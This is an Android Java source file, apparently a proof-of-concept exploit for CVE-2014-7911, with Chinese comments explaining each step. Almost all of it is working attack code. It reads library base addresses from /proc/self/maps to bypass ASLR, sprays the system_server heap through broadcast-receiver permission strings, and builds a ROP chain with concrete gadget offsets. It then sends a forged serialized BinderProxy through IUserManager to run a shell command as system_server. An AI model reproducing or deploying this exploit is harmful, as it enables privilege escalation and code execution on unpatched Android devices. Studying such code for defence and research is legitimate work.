package com.cve20147911.m4bln;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.*;
import android.os.UserHandle;
import android.os.UserManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import AAdroid.os.BinderProxy;

import java.io.File;
import java.lang.reflect.Field;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {
    public int TRANSACTION_setApplicationRestrictionsxxxxxxxxxxxxxxxxxxxxx;
    public IBinder mRemote;
    public final String TAG="m4bln";
    private  int sprayChunkLength = 100000;
    private int gadgetChunkLength = 80;
    BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context arg0, Intent arg1) {

        }
    };


    public void setApplicationRestrictions(String packageName, Bundle restrictions,
                                           int userId) throws android.os.RemoteException
    {
        android.os.Parcel _data = android.os.Parcel.obtain();
        android.os.Parcel _reply = android.os.Parcel.obtain();
        try
        {
            _data.writeInterfaceToken("android.os.IUserManager");
            _data.writeString(packageName);
            _data.writeInt(1);
            restrictions.writeToParcel(_data,0);
            _data.writeInt(userId);
            byte[] dataarray = _data.marshall();
            //更改序列化对象
            for (int i=0; true; i++) {
                if (dataarray[i] == 'A' && dataarray[i+1] == 'A' && dataarray[i+2] == 'd' && dataarray[i+3] == 'r') {
                    System.out.println("dataarray  is : "+dataarray[i]);
                    System.out.println("dataarray  is : "+dataarray[i+1]);
                    System.out.println("dataarray  is : "+dataarray[i+2]);
                    System.out.println("dataarray  is : "+dataarray[i+3]);
                    dataarray[i] = 'a';
                    dataarray[i+1] = 'n';
                    break;
                }
            }
            _data.recycle();
            _data = android.os.Parcel.obtain();
            _data.unmarshall(dataarray, 0, dataarray.length);
            System.out.println(mRemote.toString());
            mRemote.transact(TRANSACTION_setApplicationRestrictionsxxxxxxxxxxxxxxxxxxxxx, _data, _reply, 0);
            _reply.readException();
            System.out.println("error 4");




        }
//        catch (Exception e)
//        {
//            System.out.println("error hrer");
//        }

        finally {
            _reply.recycle();
            _data.recycle();
        }



    }

    int getBase(String libname)    // 获取指定lib的基地址，这些lib都是zygote孵化的，所有应用获得的基址都相同，因此可以绕过ASLR
    {
        Scanner scan=null;
        try
        {
            scan=new Scanner(new File("proc/self/maps"));
            while (scan.hasNextLine())
            {
                String[] fields = scan.nextLine().trim().split("\\s+");
                if (fields.length>=1 && fields!=null)
                {
                    String addr = fields[0];
                    if (fields.length>5) {
                        String name = fields[5];
                        if (name.equals(libname))
                        {
                            String[] addrs = addr.split("-");
                            Log.d("m4bln",libname+" : "+addrs[0]);
                            return Integer.parseInt(addrs[0],16);
                        }
                    }
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        finally {
            scan.close();
        }
        return 0;
    }

    private int[] stringToInt(String str) {
        char[] chars = str.toCharArray();
        int[] values = new int[chars.length / 4 + (chars.length % 4 == 0 ? 0 : 1)];
        int i = 0;
        for (int idx = 0; idx < values.length; idx++) {
            while (i < chars.length) {
                values[idx] += chars[i] << (8 * (i % 4));
                i++;
                if (i % 4 == 0) {
                    break;
                }
            }
        }

        return values;
    }

    public void Begin()
    {
        int ropchain[] = {0x004fed00+1,0x00068e5a+1,0x007dfc0c+1+2 ,0x000250E0+1};
        /*
        rop[0]:(libwebviewchromium.so 0x004fed00)ldr r4, [r5, #4] ; mov r0, r5 ; ldr r7, [r5] ; ldr.w r8, [r4, #0x48] ; ldr r1, [r7, #8] ; blx r1
        rop[1]:(libdvm.so 0x00068e5a ) mov sp, r7 ; pop {r3, r4, r7, pc}
        rop[2]:(libwebviewchromium.so 0x007dfc0c ) add r1, sp, #8 ; ldr r3, [sp, #0x30] ; mov r0, sp ; blx r3
        rop[3]:(libc.so system函数 0x250E0)
         */
        int dalvikHeapAddr = getBase("/dev/ashmem/dalvik-heap");
        int libWebViewChromiumAddr = getBase("/system/lib/libwebviewchromium.so");
        int libcAddr = getBase("/system/lib/libc.so");
        int libdvmAddr = getBase("/system/lib/libdvm.so");
        int staticAddr = dalvikHeapAddr + 0x01001000;

        /*
        内存构造如下：
                    --------------------------------------------------.
                    staticAddr + gadgetChunkOffset                    .
                    staticAddr + gadgetChunkOffset - 4                .
                    staticAddr + gadgetChunkOffset - 4*i          slide code
                    ...                                               .
                    ...                                               .
                    1                                                 .
                    ---------------------------------------------------
                    gadget_0_addr  //shell_code_begin_here
                    staticAddr + 0xC //shell_code + 4
                    gadget_1_addr    //shell_code + 8
                    gadget_2_addr    //shell_code + 12
                    ********
                    R0              //shell_code + 16  system函数的参数
                    ...
                    ...
                    ...
                    system_addr     //shell_code + 64
                    ...
                    ...


         */
        Log.d(TAG, "staticAddr = 0x" + Integer.toHexString(staticAddr));
        int gadgetChunkOffset = sprayChunkLength - gadgetChunkLength;
        char bytes[] = new char[sprayChunkLength/2];
        int value;
        for (int i=0;i<gadgetChunkOffset/2;i+=2)
        {
            value = staticAddr + gadgetChunkOffset  - 2*i;
            //Log.d(TAG, "sprayAddr = 0x" + Integer.toHexString(value));
            bytes[i] = (char)value;
            bytes[i+1] = (char)((value>>16)&0xffff);
        }

        value = 1;
        bytes[gadgetChunkOffset / 2 - 2] = (char) value;
        bytes[gadgetChunkOffset / 2 - 1] = (char) ((value >> 16) & 0xffff);

        value = staticAddr + 0xC;
        bytes[gadgetChunkOffset / 2 + 2] = (char) value;
        bytes[gadgetChunkOffset / 2 + 3] = (char) ((value >> 16) & 0xffff);

        value = libWebViewChromiumAddr + ropchain[0];
        Log.d(TAG, "ropchain[0] = 0x" + Integer.toHexString(value));
        bytes[gadgetChunkOffset / 2] = (char) value;
        bytes[gadgetChunkOffset / 2 + 1] = (char) ((value >> 16) & 0xffff);

        value = libdvmAddr + ropchain[1];
        Log.d(TAG, "ropchain[1] = 0x" + Integer.toHexString(value));
        bytes[gadgetChunkOffset / 2 + 4] = (char) value;
        bytes[gadgetChunkOffset / 2 + 5] = (char) ((value >> 16) & 0xffff);



        value = libWebViewChromiumAddr + ropchain[2];
        //value = 0xdeadbeaf;
        Log.d(TAG, "ropchain[2] = 0x" + Integer.toHexString(value));
        bytes[gadgetChunkOffset / 2 + 6] = (char) value;
        bytes[gadgetChunkOffset / 2 + 7] = (char) ((value >> 16) & 0xffff);

        value = libcAddr + ropchain[3];
        //value = 0xdeadbeaf;
        bytes[gadgetChunkOffset / 2 + 32] = (char) value;
        bytes[gadgetChunkOffset / 2 + 33] = (char) ((value >> 16) & 0xffff);


        String cmd = "id>/data/1.txt";
        int[] values = stringToInt(cmd);
        for (int i = 0; i < values.length; i++) {
            bytes[gadgetChunkOffset / 2 + 8 + i * 2] = (char) values[i];
            bytes[gadgetChunkOffset / 2 + 9 + i * 2] = (char) ((values[i] >> 16) & 0xffff);
        }




        String str = String.valueOf(bytes);
        for (int i = 0; i < 2000; i++) {
            heapSpary(str);
            if (i % 100 == 0) {
                Log.d(TAG, "heap sparying... " + i);
            }
        }

        exploit(staticAddr);



    }

    private void heapSpary(String str) {  //注册广播接收器，向ActivityManagerService(system_server)进程中写入大量构造好的字符串
        try {
            IntentFilter inFilter = new IntentFilter();
            registerReceiver(broadcastReceiver, inFilter, str, null);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void exploit(int staticAddr)
    /*
    1.  创建可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中;
    2.  获得跨进程调用system_server的IBinder接口mRemote，为与system_server的跨进程通信做准备;
    3.  调用setApplicationRestrictions函数，传入之前打包evilproxy的Bundle数据作为参数
     */
    {
        Context ctx = getBaseContext();

             try {
                 //-------------------------------------------------------------------
                 //创建可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中
                 Bundle b = new Bundle();
                 AAdroid.os.BinderProxy badProxy = new AAdroid.os.BinderProxy();
                 badProxy.mObject = staticAddr;
                 badProxy.mOrgue = staticAddr;
//                 badProxy.mObject = 0xdeadbeaf;
//                 badProxy.mOrgue = 0xdeadbeaf;
                 b.putSerializable("this", badProxy);
                 //------------------------------------------------------------------
                 // 获取类对象android.os.IUserManager.Stub
                 Class clIUserManager = Class.forName("android.os.IUserManager");
                 Class[] subClass = clIUserManager.getDeclaredClasses();
                 Class clStub = null;
                 for (Class cl : subClass) {
                     if (cl.getCanonicalName().equals("android.os.IUserManager.Stub")) {
                         clStub = cl;
                         System.out.println("android.os.IUserManager.Stub inner class: "+cl.getCanonicalName());

                     }

                 }


                 //获取对象android.os.IUserManager.Stub中TRANSACTION_setApplicationRestrictions的值用于transact()
                 Field wantedField = clStub.getDeclaredField("TRANSACTION_setApplicationRestrictions");
                 wantedField.setAccessible(true);
                 TRANSACTION_setApplicationRestrictionsxxxxxxxxxxxxxxxxxxxxx = wantedField.getInt(null);

                 // 获取类对象android.os.IUserManager.Stub.Proxy
                 Class[] ststubclass = clStub.getDeclaredClasses();
                 Class clProxy = null;
                 for (Class c: ststubclass)
                 {
                     if (c.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy"))
                     {
                         clProxy = c;
                         System.out.println("android.os.IUserManager.Stub.Proxy inner class: "+c.getCanonicalName());

                     }
                 }

                 // 获取UserManager类对象实例
                 UserManager um = (UserManager)ctx.getSystemService(Context.USER_SERVICE);
                 Field fService = UserManager.class.getDeclaredField("mService");
                 fService.setAccessible(true);

                 Object proxy = fService.get(um);
                 Field fRemote = clProxy.getDeclaredField("mRemote");
                 fRemote.setAccessible(true);
                 mRemote = (IBinder)fRemote.get(proxy);
                 System.out.println("mRemote is : "+mRemote.toString());
                 //-----------------------------------------------------------------
                 //通过mRemote对象传入之前打包evilproxy的Bundle数据作为参数
                 UserHandle me = android.os.Process.myUserHandle();
                 setApplicationRestrictions(ctx.getPackageName(),b,me.hashCode());

             }
             catch (Exception e)
             {
                 throw new RuntimeException(e);
             }


    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button b = (Button)findViewById(R.id.button);
        b.setOnClickListener(new View.OnClickListener() {
                                 @Override
                                 public void onClick(View view) {
                                     Toast.makeText(MainActivity.this, "begin.", Toast.LENGTH_SHORT).show();


                                     Begin();


                                 }
                             }
        );
    }
}
